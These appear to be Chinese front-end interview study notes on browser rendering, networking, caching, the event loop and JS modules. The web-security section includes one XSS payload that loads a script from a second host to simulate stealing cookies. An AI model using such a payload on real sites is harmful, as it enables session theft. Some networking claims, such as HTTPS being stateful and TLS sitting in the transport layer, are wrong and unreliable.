https://developers.google.com/web/updates/2018/09/inside-browser-part1

# 从输入 URL 到页面加载完成的过程中都发生了什么事情（https://fex.baidu.com/blog/2014/05/what-happen）
1：构建请求------查找强缓存----DNS解析------建立 TCP 连接 三次握手
4：发送 HTTP 请求-----网络响应
5：浏览器将获取的HTML文档由HTML解析器解析成DOM树（Document Object Model）。
6：同时由CSS解析器将CSS样式解析成CSS规则树（CSS Rule Tree）。
7：将生成的DOM树和CSS规则树合并生成渲染树（Rendering Tree）。
8：在绘制(painting)阶段,渲染引擎会遍历Render树,并调用renderer的 paint() 方法,将renderer的内容显示在屏幕上
9:js渲染-----------------css加载会阻塞后面js语句的执行,而(同步)js脚本执行会阻塞其后的DOM解析
10：客户端与服务器进行TCP的四次挥手。


eg：首先,当我们是要浏览一个网页,我们会在浏览器的地址栏里输入URL,这个时候Browser Process会向这个URL发送请求,获取这个URL的HTML内容,
然后将HTML交给Renderer Process,Renderer Process解析HTML内容,解析遇到需要请求网络的资源又返回来交给Browser Process进行加载,
同时通知Browser Process,需要Plugin Process加载插件资源,执行插件代码。解析完成后Renderer Process计算得到图像帧,并将这些图像帧交给GPU Process,GPU Process将其转化为图像显示屏幕。



# https的握手过程：：：：：：
客户端使用https的url访问web服务器,要求与服务器建立ssl连接
web服务器收到客户端请求后, 会将网站的证书(包含公钥)传送一份给客户端
客户端收到网站证书后会检查证书的颁发机构以及过期时间, 如果没有问题就随机产生一个秘钥
客户端利用公钥将会话秘钥加密, 并传送给服务端, 服务端利用自己的私钥解密出会话秘钥
之后服务器与客户端使用秘钥加密传输


# 布局---回流(reflow)---重绘(repaint)：：：：：：：：：
1：第一次确定节点的大小和位置称为布局。随后对节点大小和位置的重新计算称为回流
2：当Render Tree中部分或全部元素的尺寸、结构、或某些属性发生改变时,浏览器重新渲染部分或全部文档的过程称为回流。
3：当页面中元素样式的改变并不影响它在文档流中的位置时（例如 color、background-color、visibility等）,浏览器会将新样式赋予给元素并重新绘制它，这个过程称为重绘
(回流必将引起重绘,重绘不一定会引起回流)

# 会导致回流的操作：：：：：：
页面首次渲染
浏览器窗口大小发生改变
元素尺寸或位置发生改变
元素内容变化（文字数量或图片大小等等）
元素字体大小变化
添加或者删除可见的DOM元素
激活CSS伪类（例如：:hover）
查询某些属性或调用某些方法

#  一些常用且会导致回流的属性和方法：：：：：：：
clientWidth、clientHeight、clientTop、clientLeft
offsetWidth、offsetHeight、offsetTop、offsetLeft
scrollWidth、scrollHeight、scrollTop、scrollLeft
scrollIntoView()、scrollIntoViewIfNeeded()
getComputedStyle()
getBoundingClientRect()
scrollTo()



# 回流的优化：：：：：：：：：：：：：：：：：
1：使用 transform 替代 top (node.style.left="100px")  (node.style.transform="translateX(100px)")
2：不要一次一次的修改样式,而是预先定义好class,直接修改DOM的className,这样只会引发一次重排重绘
3：使用 visibility 替换 display: none ,因为前者只会引起重绘,后者会引发回流
4：改变了布局避免使用table布局,可能很小的一个小改动会造成整个 table 的重新布局。


# 浏览器渲染机制:::::::::::::::::::::::::::::::::
DOM：Document Object Model，浏览器将HTML解析成树形的数据结构,简称DOM。
CSSOM：CSS Object Model，浏览器将CSS解析成树形的数据结构,简称CSSOM。
RenderTree： DOM和CSSOM合并后生成Render Tree
Repaint ——改变某个元素的背景色、文字颜色、边框颜色等等不影响它周围或内部布局的属性时，屏幕的一部分要重画，但是元素的几何尺寸没有变。
Reflow ——元件的几何尺寸变了，我们需要重新验证并计算Render Tree。是Render Tree的一部分或全部发生了变化。
reflow 几乎是无法避免的。现在界面上流行的一些效果，比如树状目录的折叠、展开（实质上是元素的显 示与隐藏）等，都将引起浏览器的 reflow。鼠标滑过、点击……只要这些行为引起了页面上某些元素的占位面积、定位方式、边距等属性的变化，都会引起它内部、周围甚至整个页面的重新渲 染。通常我们都无法预估浏览器到底会 reflow 哪一部分的代码，它们都彼此相互影响着。
注：display: none会触发reflow，而visibility: hidden只会触发repaint，因为没有发现位置变化。


# css 加载会造成阻塞吗？:::::::::::::::::::::::::::::::::::::::::::::
css加载不会阻塞DOM树的解析?----------------下载和解析 CSS 的工作是在预解析线程中进行的。这就是 CSS 不会阻塞 HTML 解析的根本原因。
css加载会阻塞DOM树的渲染?
css加载会阻塞后面js语句的执行?

1:DOM 和 CSSOM 通常是并行构建的,所以 CSS 加载不会阻塞DOM 的解析。
2:然而由于 Render Tree 是依赖于 DOM Tree 和 CSSOM Tree 的,所以他必须等待到 CSSOM Tree 构建完成,也就是 CSS 资源加载完成(或者 CSS 资源加载失败)后,才能开始渲染。
因此,CSS 加载会阻塞 DOM 的渲染。
3:css动画会触发重绘,重绘阻塞js页面

# js 加载会造成阻塞吗？:::::::::::::::::::::::::::::::::::::::::::::
JS 代码的执行过程可能会修改当前的 DOM 树，所以 DOM 树的生成必须暂停。这就是 JS 会阻塞 HTML 解析的根本原因

# 谈一谈你对requestAnimationFrame（RAF）理解::::::::::::::::::
window.requestAnimationFrame()告诉浏览器——你希望执行一个动画，并且要求浏览器在下次重绘之前调用指定的回调函数更新动画。
该方法需要传入一个回调函数作为参数，该回调函数会在浏览器下一次重绘之前执行------cancelAnimationFrame(requestId)
每一帧要在 16.7ms (16.7 = 1000/60) 内完成渲染
RAF 的执行步伐跟着系统的绘制频率走。它能保证回调函数在屏幕每一次的绘制间隔中只被执行一次(上一个知识点刚刚梳理完「函数节流」)，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。



# 解决跨域：(https://juejin.cn/post/7075261878997352462)
1：Node中间件代理(两次跨域) （前端先访问已设置Cors的后端1,再让后端1去访问后端2获取数据到后端1，后端1再把数据传到前端）             document.domain + iframe   location.hash + iframe
2：Proxy代理跨域
3：WebSocket解决跨域
4：jsonp解决跨域(就是在script标签上面加载资源)
5：后端请求头上面加cors

同源策略是一个安全策略。所谓的同源,指的是协议,域名,端口相同。
浏览器处于安全方面的考虑,只允许本域名下的接口交互,不同源的客户端脚本,在没有明确授权的情况下,不能读写对方的资源。

# 测试跨域
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://47.93.20.245:8710/home/carbon/emission');
xhr.setRequestHeader("Content-type","application/json;charset=UTF-8");
xhr.setRequestHeader("jwt-token","JhbGciOiJSUzI1N");
xhr.send('{"pageSize":"10","pageNo":"1"}');
xhr.onload = function(e) {
var xhr = e.target;
console.log(xhr.responseText);
}

ƒ (e) {
var xhr = e.target;
console.log(xhr.responseText);
}

# 深度剖析TCP与UDP的区别
https://juejin.cn/post/6992743999756845087

# TCP优点
1：确认和重传机制 三次握手同步双方的序号,确认号,窗口大小,是确认重传和流量控制的基础。
在传输过程中，如果校验和校验失败，丢包或者延时，发送端会立马重传。
2：数据排序 有专门的序号字段,可以提供数据re-order。
3：流量控制 窗口字段可以指明双方最大的数据传输和接受量
4：拥塞控制 由四个核心算法实现：慢启动，拥塞避免，快速重传，快速恢复

# 应用场景
tcp(传输控制协议),提供的是可靠的运输,基于连接同时也说明需要的时间更长。应用于需要可靠性较高的场所。http请求,文件传输等等。
udp不基于连接。速度更快,应用于网络通讯速度较快的场景。比如语音电话、视频、直播等等。


#解读 HTTP1/HTTP2/HTTP3
https://juejin.cn/post/6995109407545622542

# HTTP2
1：二进制传输
2：Header 压缩
2：多路复用:可以只通过一个 TCP 连接就可以传输所有的请求数据。

HTTP/1.1有两个主要的缺点：安全不足和性能不高。
HTTP/2完全兼容HTTP/1，是"更安全的HTTP、更快的HTTPS"，二进制传输、头部压缩、多路复用、服务器推送等技术可以充分利用带宽，降低延迟，从而大幅度提高上网体验
QUIC 基于 UDP 实现，是 HTTP/3 中的底层支撑协议，该协议基于 UDP，又取了 TCP 中的精华，实现了即快又可靠的协议。


# 浏览器的本地存储 ：：：：：：：：：：：：：：：：：：：：：：：：：：：：：：
Cookie：体积上限只有4KB。 由于 Cookie 以纯文本的形式在浏览器和服务器中传递(cookie会跟随任意HTTP请求一起发送)
localStorage：只存在客户端,默认不参与与服务端的通信。这样就很好地避免了 Cookie 带来的性能问题和安全问题。
sessionStorage：会话结束,也就是页面关闭,这部分sessionStorage就不复存在了。


# web安全 网络安全 (https://juejin.cn/post/6844903842635579405#heading-5) ：：：：：：：：：：：
1：XSS 攻击的本质是将用户数据当成了 HTML 代码一部分来执行，从而混淆原本的语义，产生新的语义。
模拟获取cookie-----http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">

2 CSRF 英文全称是 Cross-site request forgery,所以又称为“跨站请求伪造”,是指黑客引诱用户打开黑客的网站,在黑客的网站中,利用用户的登录状态发起的跨站请求。简单来讲,「CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。」

# 措施：
对数据进行严格的输出编码：如HTML元素的编码,JS编码,CSS编码,URL编码等等
输入验证：比如一些常见的数字、URL、电话号码、邮箱地址等等做校验判断
验证码
token


# 浏览器缓存 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::
强缓存：
当浏览器去请求某个文件的时候，服务端就在respone header里面对该文件做了缓存配置。缓存的时间、缓存类型都由服务端控制
协商缓存：
发请求-->看资源是否过期-->过期-->请求服务器-->服务器对比资源是否真的过期-->没过期-->返回304状态码-->客户端用缓存的老资源。


# GET 和 POST 的区别:::::::::::::::::::::::::::::::
1：GET在浏览器回退时是无害的,而POST会再次发起请求。
2：GET请求会被浏览器主动缓存,而POST不会,除非手动设置。
3：GET请求只能进行URL编码,而POST支持多种编码方式 。
4：GET没有POST安全,因为GET请求参数直接暴露在URL上,所以不能用来传递敏感信息。
5：GET浏览器把 http header和data一起发出去,响应成功200 POST先发送header,响应100 continue,再发送data,响应成功200  GET产生一个TCP数据包,POST产生两个数据包(Firefox只发一次)。


# http请求头
Host 接受请求的服务器地址,可以是P端口号,也可以是域名
User-Agent：发送请求的应用程序名称
Connection：定与连接相关的属性 如Connection:Keep-Alve
Accept-Charset：通知服务端可以发送的编码格式
Accept-Encoding：通服务端可以发送的数据压缩格式
Accept-Language：通知服务端可以发送语言

# HTTP 和 HTTPS 的区别 ：：：：：：：：：：：：：：：：：
HTTP是明文传输,不安全的,HTTPS是加密传输,安全的多
HTTP标准端口是80,HTTPS标准端口是443
HTTP不用认证证书免费,HTTPS需要认证证书要钱
连接方式不同,HTTP三次握手,HTTPS中TLS1.2版本7次,TLS1.3版本6次
HTTP在OSI网络模型中是在应用层,而HTTPS的TLS是在传输层
HTTP是无状态的,HTTPS是有状态的

# 回收机制::::::::::::::::::::::::::
垃圾回收机制的原理是找到不再继续使用的变量，释放其内存。垃圾回收器会按照固定的时间间隔(或代码中预定的收集时间)，周期性地执行这一操作;
一个Javascript对象具有对它原型的引用（隐式引用）和对它属性的引用（显式引用）。

# 内存泄漏 (它将可能引起程序的卡顿和崩溃;)::::::::::::::::::::::::::
意外的全局变量
被忘记的定时器或者回调函数
闭包
DOM泄漏



# 浏览器兼容性问题 ：：：：：：：：：：：

## 浏览器各浏览器使用了不同的内核，并且它们处理同一件事情的时候思路不同。

1： terser + Rollup 兼容旧浏览器
import { terser } from 'rollup-plugin-terser';
import getBabelOutputPlugin from '@rollup/plugin-babel';

export default {
  input: 'src/load.js',
  plugins: [
    // https://github.com/terser/terser#minify-options
    terser({
      ecma: '5',
      compress: true,
      mangle: true,
    }),
    getBabelOutputPlugin({
      babelHelpers: 'bundled',
      presets: [
        ['@babel/preset-env', {
          targets: '> 0.25%, last 2 versions, Firefox ESR, not dead',
        }],
      ],
    }),
  ],
  output: {
    file: 'dist/load.js',
    format: 'iife',
    sourcemap: false,
  },
};






# js的执行机制：：：：：：：：：：：：：：：
js只能是单线程-------------假定JavaScript同时有两个线程,一个线程在某个DOM节点上添加内容,另一个线程删除了这个节点,这时浏览器应该以哪个线程为准？

# 进程---线程 （进（线程）程）：：：：：：：：：：：：：：：：：：：：：：：：：：
进程：是 CPU 资源分配的最小单位可以理解成正在执行的应用程序，
线程：是 CPU 调度的最小单位，可以理解成我们应用程序中的代码的执行器。而他们的关系可想而知，
线程是跑在进程里面的，一个进程里面可能有一个或者多个线程，而一个线程，只能隶属于一个进程。
GUI 渲染线程：负责渲染浏览器界面,解析 HTML,CSS,构建 DOM 树和 RenderObject 树,布局和绘制等。
JS 引擎线程：javascript 引擎,也称为 JS 内核,负责处理 Javascript 脚本程序（v8引擎）

这个引擎(V8)主要由两部分组成:
内存堆：这是内存分配发生的地方
调用栈：这是你的代码执行时的地方
GUI渲染线程与JS线程是互斥的。所以JS脚本执行和浏览器布局、绘制不能同时执行。


在 JavaScript 运行的时候，主线程会形成一个栈，这个栈主要是解释器用来最终函数执行流的一种机制。
通常这个栈被称为调用栈 Call Stack ，或者执行栈（ Execution Context Stack ）。
调用栈：顾名思义是具有LIFO(后进先出,Last in First Out)的结构。调用栈内存放的是代码执行期间的所有执行上下文
执行上下文中：都会有三个重要的属性 this、变量对象(VO)和作用域链([[scope]])
# 消息（任务）队列
分为宏任务和微任务

# 事件循环Event Loop是监听并执行消息队列中的任务。 js实现异步的一种方法,也是js的执行机制：：：：：：：：：：：：：
外部输入数据-->轮询阶段(poll)-->检查阶段(check)-->关闭事件回调阶段(close callback)-->
定时器检测阶段(timer)-->I/O事件回调阶段(I/O callbacks)-->闲置阶段(idle, prepare)-->轮询阶段..

# 事件循环的具体流程如下：
从宏任务队列中，按照 入队顺序 ，找到第一个执行的宏任务，放入调用栈，开始执行；
执行完 该宏任务下所有同步任务后，即调用栈清空后，该宏任务被推出宏任务队列，然后微任务队列开始按照入队顺序，依次执行其中的微任务，
直至微任务队列清空为止 ；当微任务队列清空后，一个事件循环结束；
接着从宏任务队列中，找到下一个执行的宏任务，开始第二个事件循环，直至宏任务队列清空为止。

# 在线调试地址：https://www.jsv9000.app/
macro-task(宏任务)：包括整体代码script,setTimeout,setInterval
micro-task(微任务)：Promise, process.nextTick(Node环境)

# async await
异步代码 同步执行
async函数表示函数里面可能会有异步方法,await后面跟一个表达式,async方法执行时,遇到await会立即执行表达式
然后把表达式后面的代码放到微任务队列里，让出执行栈让同步代码先执行



eg:  6之后执行8  是因为 6是第一个微服务 执行完微服务要执行所有的微服务

eg: 2，4 ，3，5,,24之后要执行完这里的微服务再执行下面的微服务。下面的setimeOut是第三轮的事件循环宏服务


 🌰 🌰 🌰 🌰 🌰 🌰 🌰
 setTimeout(function() {
    console.log('2');
    process.nextTick(function() {
        console.log('3');
    })
    new Promise(function(resolve) {
        console.log('4');
        resolve();
    }).then(function() {
        console.log('5')
    })
})

 🌰 🌰 🌰 🌰 🌰 🌰 🌰 🌰 1  7 6 8 2 4 3 5 9  10 11 12
console.log('1');

setTimeout(function() {
    console.log('2');
    process.nextTick(function() {
        console.log('3');
    })
    new Promise(function(resolve) {
        console.log('4');
        resolve();
    }).then(function() {
        console.log('5')
    })
})

process.nextTick(function() {
    console.log('6');
})

new Promise(function(resolve) {
    console.log('7');
    resolve();
}).then(function() {
    console.log('8')
})

setTimeout(function() {
    console.log('9');
    process.nextTick(function() {
        console.log('10');
    })
    new Promise(function(resolve) {
        console.log('11');
        resolve();
    }).then(function() {
        console.log('12')
    })
})


# SEO优化
说白了就是使得自己的网站对于搜索引擎的爬虫更加友好，目前单页面应用的大部分做法是使用前端框架，导致主页面没有相关的描述信息，详细信息大部分都是动态生成的，
对于爬虫来说去准确模拟相关的行为获取符合数据是很困难的（对于如此大规模的数据来说）



# 前端模块化：：：：：：：：：：：：：：：：：：：：：：：：：：：：：：：：
window----IIFE-------AMD-------CMD---------CommonJs----ESM

异步模块定义规范(AMD)制定了定义模块的规则,这样模块和模块的依赖可以被异步加载。
这和浏览器的异步加载模块的环境刚好适应(浏览器同步加载模块会导致性能、可用性、调试和跨域访问等问题)
AMD 是一种异步模块规范,RequireJS 是 AMD 规范的实现

1：IIFE 创建自执行函数
var testUtils = function () {
    function test(data){
        console.log(data)
    }
    return {
      test
    }
}()


：AMD（RequireJS）
 依赖必须一开始就写好
define(['./utils'], function(utils) {
  utils.request();
});

// CMD----跟requireJS解决同样问题，只是运行机制不同。
define(function(require) {
  依赖可以就近书写
  var utils = require('./utils');
  utils.request();
});

：CommonJS
随着 node 诞生，服务器端的模块规范 CommonJS 被创建出来。
var config = require('./config');
const {
    notExistFold,
    prompt,
} = require('./util.js');

module.exports = NAME
exports = NAME

ES6 module：(目前的浏览器还没有全部兼容 需要使用bable进行处理)
import api from './config.js';
import { api as myApi } from './config.js';

export const prefix = 'https://github.com';
export default function foo() {}

ES6 module 使用import导入模块接口
import { api as myApi } from './config.js';
import()实现按需加载

##  对比差异
// Named export/import  具名导出/导入:
export { sum }   
import { sum } from 'sum'  

// Default export/import  默认导出/导入:
export default sum   
import sum from 'sum'

exports 仅仅是 module.exports 的引用
// 实际上的 exports
exports = module.exports

本质是导出exports对象{}

## CommonJS与ES6 Module最本质的区别是：动态vs静态

CommonJS对模块依赖的解决是“动态的”（只能在运行时，分析出对应的依赖关系）
ES6 Module是“静态的”（可以在编译时，就分析出对应的依赖关系，才能做tree shaking）

require的模块路径可以动态指定，支持传入一个表达式，我们甚至可以通过if语句判断是否加载某个模块。
因此，在CommonJS模块被执行前，并没有办法确定明确的依赖关系，模块的导入、导出发生在代码的运行阶段。

对于CommonJS来说获取的是一份导出值的拷贝；
而在ES6 Module中则是值的动态映射，并且这个映射是只读的。


# CDN原理::::::::::::::::::::::::::::::::::::::::::::::::::::::
CDN 全称 Content Delivery Network，即内容分发网络
其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。

CDN 的工作原理：就是将源站的资源缓存CDN各个节点上,当请求命中了某个节点的资源缓存时，立即返回客户端，
避免每个请求的资源都通过源站获取，避免网络拥塞、缓解源站压力，保证用户访问资源的速度和体验
🌰🌰举一个生活中的例子，我们在某东上购买商品，快递能做到当日送达，其根本原理是通过在全国各地建设本地仓库。当用户购买商品时，通过智能仓配模式，为消费者选择就近仓库发货，从而缩短物流配送时间





# 扩展 webRtc：：：：Real Time Communications

webSocket 如何兼容低浏览器？

Adobe Flash Socket 、
ActiveX HTMLFile (IE) 、
基于 multipart 编码发送 XHR 、
基于长轮询的 XHR。



